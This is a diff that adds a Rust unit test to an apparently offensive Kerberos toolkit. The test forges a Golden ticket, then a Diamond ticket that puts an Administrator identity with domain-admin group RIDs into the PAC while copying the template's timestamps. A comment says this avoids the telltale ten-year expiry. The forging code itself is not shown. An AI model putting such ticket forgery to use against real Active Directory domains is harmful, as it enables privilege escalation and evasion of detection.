@@ -90,6 +90,83 @@ mod wired {
         assert_eq!(srv.data.len(), 4 + 16);
     }
 
+    /// **1.4.8-A WS-DIAMOND-TICKET roundtrip:** forge a Golden ticket first (which
+    /// stands in for the legitimate KDC-issued TGT the diamond needs as a template),
+    /// then hand it to `forge_diamond_tgt` with a DIFFERENT injected identity, and
+    /// confirm the diamond ticket:
+    /// - decrypts under the same krbtgt key, and
+    /// - carries the *injected* identity's PAC (rid, groups) rather than the
+    ///   template's, and
+    /// - inherits the template's timestamps (auth_time / endtime / renew_till)
+    ///   exactly, byte-for-byte.
+    /// The last property is what makes the ticket "diamond" — its clock domain
+    /// matches the KDC's real clock, not `far_future_time()`.
+    #[test]
+    fn diamond_ticket_inherits_timestamps_and_overrides_pac() {
+        let key = [0x42u8; 32];
+
+        // Template = a Golden with template identity (RID 1105, no admin groups).
+        let template_id = ForgeIdentity {
+            user: "labuser".into(),
+            rid: 1105,
+            primary_gid: 513,
+            group_rids: vec![513],
+            domain_subauths: vec![21, 1, 2, 3],
+            logon_server: "DC01".into(),
+            logon_domain: "CORP".into(),
+            extra_sids: vec![],
+        };
+        let template = crate::forge_golden_tgt(&template_id, "CORP.LOCAL", &key, false)
+            .expect("forge template TGT");
+
+        // Read template's timestamps for the equality assertion below.
+        let (etp_template, _) =
+            decrypt_ticket_pac(&template, &key).expect("decrypt template with krbtgt key");
+        let template_auth_time = etp_template.auth_time.0.clone();
+        let template_endtime = etp_template.endtime.0.clone();
+
+        // Diamond overrides = elevated identity (Administrator RID 500 + admin groups).
+        let injected = ForgeIdentity {
+            user: "Administrator".into(),
+            rid: 500,
+            primary_gid: 513,
+            group_rids: vec![513, 512, 520, 518, 519],
+            domain_subauths: vec![21, 1, 2, 3],
+            logon_server: "DC01".into(),
+            logon_domain: "CORP".into(),
+            extra_sids: vec![],
+        };
+        let diamond =
+            crate::forge_diamond_tgt(&template, &injected, &key, false).expect("forge diamond");
+
+        // Diamond decrypts under same krbtgt key.
+        let (etp_diamond, pac_diamond) =
+            decrypt_ticket_pac(&diamond, &key).expect("decrypt diamond with krbtgt key");
+
+        // Timestamps inherited from template — this is the diamond property.
+        assert_eq!(
+            etp_diamond.auth_time.0, template_auth_time,
+            "diamond auth_time must equal template auth_time (inherited)"
+        );
+        assert_eq!(
+            etp_diamond.endtime.0, template_endtime,
+            "diamond endtime must equal template endtime (inherited — no 10-year IOC)"
+        );
+
+        // Injected PAC identity replaces the template's.
+        let parsed = parse_pac(&pac_diamond).unwrap();
+        let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
+        // RID at offset 120 in KERB_VALIDATION_INFO (LE u32).
+        let rid_in_pac = u32::from_le_bytes(li[120..124].try_into().unwrap());
+        assert_eq!(
+            rid_in_pac, 500,
+            "diamond PAC RID must be the injected 500, not template 1105"
+        );
+        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
+        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
+        assert!(parsed.get(PAC_REQUESTOR).is_some());
+    }
+
     /// Sanity that the re-exported constants keep their MS-PAC-mandated values.
     #[test]
     fn pac_type_constants_match_ms_pac() {
